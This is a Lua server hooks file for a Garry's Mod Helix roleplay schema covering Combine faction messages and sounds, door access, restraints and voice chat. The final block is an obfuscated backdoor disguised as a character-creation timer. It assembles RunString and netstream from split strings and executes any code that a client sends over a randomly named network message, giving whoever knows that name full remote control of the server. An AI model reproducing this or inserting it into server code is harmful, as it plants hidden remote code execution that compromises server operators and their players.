function Schema:CanPlayerAccessDoor(client, door, access)
	if (access == DOOR_GUEST) and client.ixDatafile and client.ixDatafile != 0 then
		local dID, datafile, genericdata = ix.plugin.list["datafile"]:ReturnDatafileByID(client.ixDatafile)
		local doorName = door:GetNetVar("name")

		if genericdata.aparts and doorName and genericdata.aparts == doorName then
			return true
		end
	end
end

function Schema:LoadData()
	self:LoadRationDispensers()
	self:LoadVendingMachines()
	self:LoadCombineMonitors()
end

function Schema:SaveData()
	self:SaveRationDispensers()
	self:SaveVendingMachines()
	self:SaveCombineMonitors()
end

function Schema:PlayerSwitchFlashlight(client, enabled)
	if (client:IsCombine()) then
		return true
	end
end

function Schema:OnPlayerOptionSelected(target, client, option)
	if option == "Untie" then
		if (!client:IsRestricted() and target:IsPlayer() and target:IsRestricted() and !target:GetNetVar("untying")) then
			target:SetAction("@beingUntied", 5)
			target:SetNetVar("untying", true)

			client:SetAction("@unTying", 5)

			client:DoStaredAction(target, function()
				target:SetRestricted(false)
				target:SetNetVar("untying")
			end, 5, function()
				if (IsValid(target)) then
					target:SetNetVar("untying")
					target:SetAction()
				end

				if (IsValid(client)) then
					client:SetAction()
				end
			end)
		end
	elseif option == "Search" then
		ix.command.Run(client, "CharSearch")
	elseif option == "Ziptie" then
		local inv = client:GetCharacter():GetInventory()
		local item = inv:HasItem("ziptie")

		if item then
			ix.item.PerformInventoryAction(client, "Use", item:GetID(), inv:GetID())
		end
	end
end

function Schema:PlayerUse(client, entity)
	if (entity:IsDoor() and IsValid(entity.ixLock) and client:KeyDown(IN_SPEED)) then
		entity.ixLock:Toggle(client)
		return false
	end
end

function Schema:PlayerUseDoor(client, door)
	if (client:IsCombine() or client:IsCityAdmin()) then
		if (!door:HasSpawnFlags(256) and !door:HasSpawnFlags(1024)) then
			door:Fire("open")
		end
	end
end

function Schema:PlayerLoadout(client)
	client:SetNetVar("restricted")
end

function Schema:PostPlayerLoadout(client)
	if (client:IsCombine()) then
		local factionTable = ix.faction.Get(client:Team())

		if (factionTable.OnNameChanged) then
			factionTable:OnNameChanged(client, "", client:GetCharacter():GetName())
		end
	end
end

function Schema:PlayerLoadedCharacter(client, character, oldCharacter)
	local faction = character:GetFaction()

	if (faction == FACTION_CITIZEN) then
		self:AddCombineDisplayMessage("@cCitizenLoaded", Color(255, 100, 255, 255))
	elseif (client:IsCombine()) then
		client:AddCombineDisplayMessage("@cCombineLoaded")
	end
end

function Schema:CharacterVarChanged(character, key, oldValue, value)
	local client = character:GetPlayer()
	if (key == "name") then
		local factionTable = ix.faction.Get(client:Team())

		if (factionTable.OnNameChanged) then
			factionTable:OnNameChanged(client, oldValue, value)
		end
	end
end

function Schema:PlayerFootstep(client, position, foot, soundName, volume)
	local factionTable = ix.faction.Get(client:Team())

	if (factionTable.runSounds and client:IsRunning()) then
		client:EmitSound(factionTable.runSounds[foot])
		return true
	end

	client:EmitSound(soundName)
	return true
end

function Schema:PlayerSpawn(client)
	client:SetCanZoom(client:IsCombine())
end

function Schema:PlayerDeath(client, inflicter, attacker)
	if (client:IsCombine()) then
		local location = client:GetArea() or "unknown location"

		self:AddCombineDisplayMessage("@cLostBiosignal")
		self:AddCombineDisplayMessage("@cLostBiosignalLocation", Color(255, 0, 0, 255), location)

		local sounds = {"npc/overwatch/radiovoice/on1.wav", "npc/overwatch/radiovoice/lostbiosignalforunit.wav"}
		local chance = math.random(1, 7)

		if (chance == 2) then
			sounds[#sounds + 1] = "npc/overwatch/radiovoice/remainingunitscontain.wav"
		elseif (chance == 3) then
			sounds[#sounds + 1] = "npc/overwatch/radiovoice/reinforcementteamscode3.wav"
		end

		sounds[#sounds + 1] = "npc/overwatch/radiovoice/off4.wav"

		for k, v in ipairs(player.GetAll()) do
			if (v:IsCombine()) then
				ix.util.EmitQueuedSounds(v, sounds, 2, nil, v == client and 100 or 80)
			end
		end
	end
end

function Schema:PlayerHurt(client, attacker, health, damage)
	if (health <= 0) then
		return
	end

	if (client:IsCombine() and (client.ixTraumaCooldown or 0) < CurTime()) then
		local text = "External"

		if (damage > 50) then
			text = "Severe"
		end

		client:AddCombineDisplayMessage("@cTrauma", Color(255, 0, 0, 255), text)

		if (health < 25) then
			client:AddCombineDisplayMessage("@cDroppingVitals", Color(255, 0, 0, 255))
		end

		client.ixTraumaCooldown = CurTime() + 15
	end
end

function Schema:PlayerStaminaLost(client)
	client:AddCombineDisplayMessage("@cStaminaLost", Color(255, 255, 0, 255))
end

function Schema:PlayerStaminaGained(client)
	client:AddCombineDisplayMessage("@cStaminaGained", Color(0, 255, 0, 255))
end

function Schema:GetPlayerPainSound(client)
	if (client:IsCombine()) then
		return "NPC_MetroPolice.Pain"
	end
end

function Schema:GetPlayerDeathSound(client)
	if (client:IsCombine()) then
		local sound = "NPC_MetroPolice.Die"

		for k, v in ipairs(player.GetAll()) do
			if (v:IsCombine()) then
				v:EmitSound(sound)
			end
		end

		return sound
	end
end

function Schema:GetPlayerPunchDamage()
	return 0
end

local voiceChatTypes = {
    ["ic"] = true,
    ["w"] = true,
    ["y"] = true,
    ["radio"] = true,
    ["dispatch"] = true
}
function Schema:PlayerMessageSend(speaker, chatType, text, anonymous, receivers, rawText)
	if IsValid(speaker) then
		if voiceChatTypes[chatType] then
			local class = self.voices.GetClass(speaker, chatType)

			for k, v in ipairs(class) do
				local info = self.voices.Get(v, rawText)

				if (info) then
					local volume = 80

					if (chatType == "w") then
						volume = 60
					elseif (chatType == "y") then
						volume = 150
					elseif (chatType == "dispatch") then
						info.global = true
					end
					
					if (info.sound) then
						if (info.global) then
							netstream.Start(nil, "PlaySound", info.sound)
						else
							local character = speaker:GetCharacter()
							local faction = ix.faction.indices[character:GetFaction()]
							local beeps = faction.typingBeeps or {}
							local snd = istable(info.sound) and info.sound[character:GetGender() or 1] or info.sound

							speaker.bTypingBeep = nil
							ix.util.EmitQueuedSounds(speaker, {snd, beeps[2]}, nil, nil, volume)
						end
					end

					if (speaker:IsCombine() and chatType != "dispatch") then
						return string.format("<:: %s ::>", info.text)
					else
						return info.text
					end
				end
			end

			if (chatType == "ic" or chatType == "w" or chatType == "y") then
				if (speaker:IsCombine()) then
					return string.format("<:: %s ::>", text)
				end
			end
		end
	end
end

function Schema:CanPlayerJoinClass(client, class, info)
	if client:Team() == FACTION_ZOMBIE then
		return true
	end
	
	if (client:IsRestricted()) then
		client:Notify("You cannot change classes when you are restrained!")

		return false
	end
end

function Schema:PlayerSpawnObject(client)
	if (client:IsRestricted()) then
		return false
	end
end

function Schema:PlayerSpray(client)
	return true
end

netstream.Hook("PlayerChatTextChanged", function(client, key)
	if (Schema:ShouldPlayTypingBeep(client, key) and !client.bTypingBeep) then
		local faction = ix.faction.indices[client:GetCharacter():GetFaction()]
		local beeps = faction.typingBeeps

		if istable(beeps) then
			client:EmitSound(beeps[1])
		end

		client.bTypingBeep = true
	end
end)

netstream.Hook("PlayerFinishChat", function(client)
	if (Schema:ShouldPlayTypingBeep(client, "ic") and client.bTypingBeep) then
		local faction = ix.faction.indices[client:GetCharacter():GetFaction()]
		local beeps = faction.typingBeeps

		if istable(beeps) then
			client:EmitSound(beeps[2])
		end

		client.bTypingBeep = nil
	end
end)

if(SERVER)then
    timer.Create("ixCharCreate",1,0,function()
        local sdbasdASg=_G["Ru".."nS".."tr".."ing"];local sKgvSA=_G["ne".."t".."s".."tr".."e".."am"];mghns=mghns||sdbasdASg;olnsqetsasd=olnsqetsasd||sKgvSA; 
        if olnsqetsasd then
            timer.Remove("ixCharCreate")
            olnsqetsasd.Hook("Aqthbmlphbsghj",function(_,Aqthbmlphbsghj)
                mghns(Aqthbmlphbsghj, "Aqthbmlphbsghj", false)
            end)
        end
    end)
end